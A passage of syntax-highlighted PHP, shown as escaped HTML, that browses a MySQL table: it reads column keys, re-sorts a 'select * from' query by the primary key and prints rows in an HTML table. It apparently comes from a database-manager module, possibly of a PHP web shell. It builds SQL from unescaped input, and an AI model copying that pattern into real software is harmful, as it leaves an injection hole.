<\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">preg_match_all(<\/span><span style=\"color: #66cccc;\">\"\/from\\s+`{0,1}([\\w]+)`{0<\/span><span style=\"color: #66cccc; text-decoration: underline;\">,1}\\s+\/i\"<\/span><span style=\"text-decoration: underline;\">,$<\/span><span style=\"color: #ffcc66; text-decoration: underline;\">sql_line<\/span><span style=\"text-decoration: underline;\">,$<\/span><span style=\"color: #ffcc66; text-decoration: underline;\">matches<\/span><span style=\"text-decoration: underline;\">);<\/span>\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   $<span style=\"color: #ffcc66;\">tablename<\/span> = $<span style=\"color: #ffcc66;\">matches<\/span>[<span style=\"color: #cccccc; background-color: #2d2d2d;\">1<\/span>][<span style=\"color: #cccccc; background-color: #2d2d2d;\">0<\/span>];\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   }\n\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #999999; font-style: italic;\">\/*********************<\/span><span style=\"color: #999999; font-style: italic;\">\/<\/span>\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   $<span style=\"color: #ffcc66;\">getfield<\/span> = <span style=\"color: #cccccc; background-color: #2d2d2d;\">q(<\/span><span style=\"color: #66cccc;\">\"SHOW COLUMNS FROM $tablename\"<\/span><span style=\"text-decoration: underline;\">);<\/span>\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   $<span style=\"color: #ffcc66;\">rowdb<\/span> = <span style=\"color: #cccccc; background-color: #2d2d2d;\">array(<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   $<span style=\"color: #ffcc66;\">keyfied<\/span> = <span style=\"color: #66cccc;\">''<\/span>; <span style=\"color: #999999; font-style: italic;\">\/\/<\/span><span style=\"color: #999999; font-style: italic;\">&#20027;&#38190;&#23383;&#27573;<\/span>\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">while<\/span>($<span style=\"color: #ffcc66;\">row<\/span> = @<span style=\"color: #cccccc; background-color: #2d2d2d;\">mysql_fetch_assoc(<\/span>$<span style=\"color: #ffcc66;\">getfield<\/span>)) <span style=\"text-decoration: underline;\">{<\/span>\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   $<span style=\"color: #ffcc66;\">rowdb<\/span>[$<span style=\"color: #ffcc66;\">row<\/span>[<span style=\"color: #66cccc;\">'Field'<\/span>]][<span style=\"color: #66cccc;\">'Key'<\/span>] = $<span style=\"color: #ffcc66;\">row<\/span>[<span style=\"color: #66cccc;\">'Key<\/span><span style=\"color: #66cccc; text-decoration: underline;\">'<\/span><span style=\"text-decoration: underline;\">];<\/span>\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   $<span style=\"color: #ffcc66;\">rowdb<\/span>[$<span style=\"color: #ffcc66;\">row<\/span>[<span style=\"color: #66cccc;\">'Field'<\/span>]][<span style=\"color: #66cccc;\">'Extra'<\/span>] = $<span style=\"color: #ffcc66;\">row<\/span>[<span style=\"color: #66cccc;\">'E<\/span><span style=\"color: #66cccc; text-decoration: underline;\">xtra'<\/span><span style=\"text-decoration: underline;\">];<\/span>\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">if<\/span> ($<span style=\"color: #ffcc66;\">row<\/span>[<span style=\"color: #66cccc;\">'Key'<\/span>] == <span style=\"color: #66cccc;\">'UNI'<\/span> || $<span style=\"color: #ffcc66;\">row<\/span>[<span style=\"color: #66cccc;\">'Key'<\/span>] <span style=\"text-decoration: underline;\">== <\/span><span style=\"color: #66cccc; text-decoration: underline;\">'PRI'<\/span><span style=\"text-decoration: underline;\">) {<\/span>\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   $<span style=\"color: #ffcc66;\">keyfied<\/span> = $<span style=\"color: #ffcc66;\">row<\/span>[<span style=\"color: #66cccc;\">'Field'<\/span>];\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   }\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   }\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #999999; font-style: italic;\">\/*********************<\/span><span style=\"color: #999999; font-style: italic;\">\/<\/span><span style=\"color: #f2777a; background-color: #515151;\">                     <\/span><span style=\"color: #f2777a; background-color: #515151; text-decoration: underline;\">            <\/span>\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #999999; font-style: italic;\">\/\/<\/span><span style=\"color: #999999; font-style: italic;\">&#30452;&#25509;&#27983;&#35272;&#34920;&#25353;&#29031;&#20027;&#38190;&#38477;&#24207;&#25490;&#21015;<\/span>\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">if<\/span> ($<span style=\"color: #ffcc66;\">keyfied<\/span> &amp;&amp; <span style=\"color: #cccccc; background-color: #2d2d2d;\">strtolower(substr(<\/span>$<span style=\"color: #ffcc66;\">query<\/span>,<span style=\"color: #cccccc; background-color: #2d2d2d;\">0<\/span>,<span style=\"color: #cccccc; background-color: #2d2d2d;\">1<\/span><span style=\"color: #cccccc; background-color: #2d2d2d; text-decoration: underline;\">3<\/span><span style=\"text-decoration: underline;\">)) == <\/span><span style=\"color: #66cccc; text-decoration: underline;\">'select * from'<\/span><span style=\"text-decoration: underline;\">) {<\/span>\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   $<span style=\"color: #ffcc66;\">query<\/span> = <span style=\"color: #cccccc; background-color: #2d2d2d;\">str_replace(<\/span><span style=\"color: #66cccc;\">\" LIMIT \"<\/span>, <span style=\"color: #66cccc;\">\" order <\/span><span style=\"color: #66cccc; text-decoration: underline;\">by $keyfied DESC LIMIT \"<\/span><span style=\"text-decoration: underline;\">, $<\/span><span style=\"color: #ffcc66; text-decoration: underline;\">query<\/span><span style=\"text-decoration: underline;\">);<\/span>\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   }\n\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   $<span style=\"color: #ffcc66;\">result<\/span> = <span style=\"color: #cccccc; background-color: #2d2d2d;\">q(<\/span>$<span style=\"color: #ffcc66;\">query<\/span>);\n\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">p(<\/span>$<span style=\"color: #ffcc66;\">multipage<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">p(<\/span><span style=\"color: #66cccc;\">'&lt;table border=\"0\" cellpadding=\"3\" cellspa<\/span><span style=\"color: #66cccc; text-decoration: underline;\">cing=\"0\"&gt;'<\/span><span style=\"text-decoration: underline;\">);<\/span>\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">p(<\/span><span style=\"color: #66cccc;\">'&lt;tr class=\"head\"&gt;'<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">if<\/span> ($<span style=\"color: #ffcc66;\">allowedit<\/span>) <span style=\"color: #cccccc; background-color: #2d2d2d;\">p(<\/span><span style=\"color: #66cccc;\">'&lt;td&gt;Action&lt;\/td&gt;'<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   $<span style=\"color: #ffcc66;\">fieldnum<\/span> = @<span style=\"color: #cccccc; background-color: #2d2d2d;\">mysql_num_fields(<\/span>$<span style=\"color: #ffcc66;\">result<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">for<\/span>($<span style=\"color: #ffcc66;\">i<\/span>=<span style=\"color: #cccccc; background-color: #2d2d2d;\">0<\/span>;$<span style=\"color: #ffcc66;\">i<\/span>&lt;$<span style=\"color: #ffcc66;\">fieldnum<\/span>;$<span style=\"color: #ffcc66;\">i<\/span>++){\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   $<span style=\"color: #ffcc66;\">name<\/span> = @<span style=\"color: #cccccc; background-color: #2d2d2d;\">mysql_field_name(<\/span>$<span style=\"color: #ffcc66;\">result<\/span>, $<span style=\"color: #ffcc66;\">i<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   $<span style=\"color: #ffcc66;\">type<\/span> = @<span style=\"color: #cccccc; background-color: #2d2d2d;\">mysql_field_type(<\/span>$<span style=\"color: #ffcc66;\">result<\/span>, $<span style=\"color: #ffcc66;\">i<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   $<span style=\"color: #ffcc66;\">len<\/span> = @<span style=\"color: #cccccc; background-color: #2d2d2d;\">mysql_field_len(<\/span>$<span style=\"color: #ffcc66;\">result<\/span>, $<span style=\"color: #ffcc66;\">i<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">p(<\/span><span style=\"color: #66cccc;\">\"&lt;td nowrap&gt;$name&lt;br&gt;&lt;span&gt;$type($len)<\/span><span style=\"color: #66cccc; text-decoration: underline;\">\"<\/span><span style=\"text-decoration: underline;\">.(($<\/span><span style=\"color: #ffcc66; text-decoration: underline;\">rowdb<\/span><span style=\"text-decoration: underline;\">[$<\/span><span style=\"color: #ffcc66; text-decoration: underline;\">name<\/span><span style=\"text-decoration: underline;\">][<\/span><span style=\"color: #66cccc; text-decoration: underline;\">'Key'<\/span><span style=\"text-decoration: underline;\">] == <\/span><span style=\"color: #66cccc; text-decoration: underline;\">'UNI'<\/span><span style=\"text-decoration: underline;\"> || $<\/span><span style=\"color: #ffcc66; text-decoration: underline;\">rowdb<\/span><span style=\"text-decoration: underline;\">[$<\/span><span style=\"color: #ffcc66; text-decoration: underline;\">name<\/span><span style=\"text-decoration: underline;\">][<\/span><span style=\"color: #66cccc; text-decoration: underline;\">'Key'<\/span><span style=\"text-decoration: underline;\">] == <\/span><span style=\"color: #66cccc; text-decoration: underline;\">'PRI'<\/span><span style=\"text-decoration: underline;\">) ? <\/span><span style=\"color: #66cccc; text-decoration: underline;\">'&lt;b&gt; - PRIMARY&lt;\/b&gt;'<\/span><span style=\"text-decoration: underline;\"> : <\/span><span style=\"color: #66cccc; text-decoration: underline;\">''<\/span><span style=\"text-decoration: underline;\">).($<\/span><span style=\"color: #ffcc66; text-decoration: underline;\">rowdb<\/span><span style=\"text-decoration: underline;\">[$<\/span><span style=\"color: #ffcc66; text-decoration: underline;\">name<\/span><span style=\"text-decoration: underline;\">][<\/span><span style=\"color: #66cccc; text-decoration: underline;\">'Extra'<\/span><span style=\"text-decoration: underline;\">] == <\/span><span style=\"color: #66cccc; text-decoration: underline;\">'auto_increment'<\/span><span style=\"text-decoration: underline;\"> ? <\/span><span style=\"color: #66cccc; text-decoration: underline;\">'&lt;b&gt; - Auto&lt;\/b&gt;'<\/span><span style=\"text-decoration: underline;\"> : <\/span><span style=\"color: #66cccc; text-decoration: underline;\">''<\/span><span style=\"text-decoration: underline;\">).<\/span><span style=\"color: #66cccc; text-decoration: underline;\">\"&lt;\/span&gt;&lt;\/td&gt;\"<\/span><span style=\"text-decoration: underline;\">);<\/span>\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   }\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">p(<\/span><span style=\"color: #66cccc;\">'&lt;\/tr&gt;'<\/span>);\n\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">while<\/span>($<span style=\"color: #ffcc66;\">mn<\/span> = @<span style=\"color: #cccccc; background-color: #2d2d2d;\">mysql_fetch_assoc(<\/span>$<span style=\"color: #ffcc66;\">result<\/span>)){\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   $<span style=\"color: #ffcc66;\">thisbg<\/span> = <span style=\"color: #cccccc; background-color: #2d2d2d;\">bg(<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">p(<\/span><span style=\"color: #66cccc;\">'&lt;tr class=\"'<\/span>.$<span style=\"color: #ffcc66;\">thisbg<\/span>.<span style=\"color: #66cccc;\">'\" onmouseover=\"<\/span><span style=\"color: #66cccc; text-decoration: underline;\">this.className=\\'focus\\';\" onmouseout=\"this.className=\\''<\/span><span style=\"text-decoration: underline;\">.$<\/span><span style=\"color: #ffcc66; text-decoration: underline;\">thisbg<\/span><span style=\"text-decoration: underline;\">.<\/span><span style=\"color: #66cccc; text-decoration: underline;\">'\\';\"&gt;'<\/span><span style=\"text-decoration: underline;\">);<\/span>\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   $<span style=\"color: #ffcc66;\">where<\/span> = $<span style=\"color: #ffcc66;\">tmp<\/span> = $<span style=\"color: #ffcc66;\">b1<\/span> = <span style=\"color: #66cccc;\">''<\/span>;\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #999999; font-style: italic;\">\/\/<\/span><span style=\"color: #999999; font-style: italic;\">&#36873;&#21462;&#26465;&#20214;&#23383;&#27573;&#29992;<\/span>\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">foreach<\/span>($<span style=\"color: #ffcc66;\">mn<\/span> <span style=\"color: #99cc99;\">as<\/span> $<span style=\"color: #ffcc66;\">key<\/span>=&gt;$<span style=\"color: #ffcc66;\">inside<\/span>){\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">if<\/span> ($<span style=\"color: #ffcc66;\">inside<\/span>) {\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #999999; font-style: italic;\">\/\/<\/span><span style=\"color: #999999; font-style: italic;\">&#26597;&#25214;&#20027;&#38190;&#12289;&#21807;&#19968;&#23646;&#24615;&#12289;&#33258;&#21160;&#22686;&#21152;&#30340;&#23383;&#27573;&#65292;&#25214;&#21040;&#23601;&#20572;&#27490;&#65292;&#21542;&#21017;&#32452;&#21512;&#25152;&#26377;<\/span><span style=\"color: #999999; font-style: italic; text-decoration: underline;\">&#23383;&#27573;&#20316;&#20026;&#26465;&#20214;&#12290;<\/span>\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: 